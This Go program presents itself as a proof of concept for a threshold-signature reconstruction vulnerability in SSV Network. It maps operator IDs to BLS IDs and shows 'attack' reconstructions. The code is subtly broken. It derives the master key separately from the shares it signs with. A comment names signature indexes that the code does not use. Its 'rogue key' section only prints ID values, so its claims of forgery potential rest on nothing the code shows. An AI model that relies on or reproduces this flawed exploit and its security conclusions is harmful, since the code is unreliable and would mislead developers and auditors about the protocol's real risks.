package main

import (
	"fmt"
	"github.com/herumi/bls-eth-go-binary/bls"
)

// Proof of Concept for SSV Network Threshold Signature Reconstruction Vulnerability
// This demonstrates how the direct operator ID to BLS ID mapping could be exploited

func main() {
	if err := bls.Init(bls.BLS12_381); err != nil {
		panic(err)
	}
	if err := bls.SetETHmode(bls.EthModeLatest); err != nil {
		panic(err)
	}

	// Simulate the vulnerable ReconstructSignatures function from SSV
	fmt.Println("=== SSV Network Signature Reconstruction Vulnerability PoC ===\n")

	// Create a threshold scheme (3 out of 4)
	threshold := 3
	numShares := 4
	
	// Generate master key
	masterKey := &bls.SecretKey{}
	masterKey.SetByCSPRNG()
	
	masterPubKey := masterKey.GetPublicKey()
	fmt.Printf("Master Public Key: %s\n", masterPubKey.SerializeToHexStr())

	// Create legitimate shares
	var secretKeys []*bls.SecretKey
	var pubKeys []*bls.PublicKey
	var ids []bls.ID
	
	for i := 0; i < numShares; i++ {
		sk := &bls.SecretKey{}
		sk.SetByCSPRNG()
		secretKeys = append(secretKeys, sk)
		pubKeys = append(pubKeys, sk.GetPublicKey())
		
		// This mimics SSV's vulnerable ID assignment: SetDecString(fmt.Sprintf("%d", operatorID))
		var id bls.ID
		id.SetDecString(fmt.Sprintf("%d", i+1)) // operator IDs start from 1
		ids = append(ids, id)
	}

	// Create threshold shares using polynomial interpolation
	var thresholdSKs []*bls.SecretKey
	for i := 0; i < numShares; i++ {
		sk := &bls.SecretKey{}
		sk.Set(secretKeys[:threshold], ids[i:i+1])
		thresholdSKs = append(thresholdSKs, sk)
	}

	// Test message to sign
	message := []byte("test_beacon_block")
	
	// Create legitimate signatures
	var signatures []*bls.Sign
	for i := 0; i < threshold; i++ {
		sig := thresholdSKs[i].SignByte(message)
		signatures = append(signatures, sig)
	}
	
	// Normal reconstruction (should work)
	normalSig := &bls.Sign{}
	if err := normalSig.Recover(signatures, ids[:threshold]); err != nil {
		fmt.Printf("Normal reconstruction failed: %v\n", err)
		return
	}
	
	normalValid := normalSig.VerifyByte(masterPubKey, message)
	fmt.Printf("Normal reconstruction valid: %v\n", normalValid)
	
	// VULNERABILITY DEMONSTRATION: Operator ID manipulation
	fmt.Println("\n=== VULNERABILITY: Operator ID Manipulation ===")
	
	// An attacker who controls operator registration could choose specific operator IDs
	// that map to advantageous BLS curve points
	attackerOperatorIDs := []uint64{1, 2, 4} // Skipping 3, using 4 instead
	
	var attackerIDs []bls.ID
	for _, opID := range attackerOperatorIDs {
		var id bls.ID
		id.SetDecString(fmt.Sprintf("%d", opID))
		attackerIDs = append(attackerIDs, id)
	}
	
	// The attacker can now reconstruct with different interpolation points
	attackSig := &bls.Sign{}
	// Using signature at index 0, 1, and 3 (which corresponds to operator ID 4)
	attackSignatures := []*bls.Sign{signatures[0], signatures[1], signatures[2]}
	
	if err := attackSig.Recover(attackSignatures, attackerIDs); err != nil {
		fmt.Printf("Attack reconstruction failed: %v\n", err)
	} else {
		attackValid := attackSig.VerifyByte(masterPubKey, message)
		fmt.Printf("Attack reconstruction valid: %v\n", attackValid)
		fmt.Printf("Attack signature: %s\n", attackSig.SerializeToHexStr())
		fmt.Printf("Normal signature: %s\n", normalSig.SerializeToHexStr())
		
		if attackSig.IsEqual(normalSig) {
			fmt.Println("🚨 CRITICAL: Attack produced same signature!")
		} else {
			fmt.Println("⚠️  Attack produced different signature - potential for signature forgery")
		}
	}
	
	// DEMONSTRATION: Potential for rogue key attack
	fmt.Println("\n=== POTENTIAL ROGUE KEY ATTACK ===")
	
	// If an attacker can influence multiple operator registrations, they might be able to
	// create a scenario where they can forge signatures by controlling the polynomial
	// interpolation points
	
	// Simulate attacker controlling 2 out of 4 operators with carefully chosen IDs
	rogueIDs := []uint64{1, 1000000} // One normal, one with large ID
	
	fmt.Printf("Attacker could potentially register operators with IDs: %v\n", rogueIDs)
	fmt.Println("This changes the Lagrange interpolation coefficients significantly")
	
	// Show how this affects the interpolation
	for i, id := range rogueIDs {
		var blsID bls.ID
		blsID.SetDecString(fmt.Sprintf("%d", id))
		fmt.Printf("BLS ID %d: %s\n", i, blsID.GetHexString())
	}
	
	fmt.Println("\n=== RECOMMENDATIONS ===")
	fmt.Println("1. Use cryptographically secure operator ID to BLS ID mapping")
	fmt.Println("2. Validate that operator IDs cannot be chosen maliciously")
	fmt.Println("3. Implement proper key share validation during setup")
	fmt.Println("4. Add integrity checks for share reconstruction")
	fmt.Println("5. Monitor for unusual operator ID patterns during registration")
}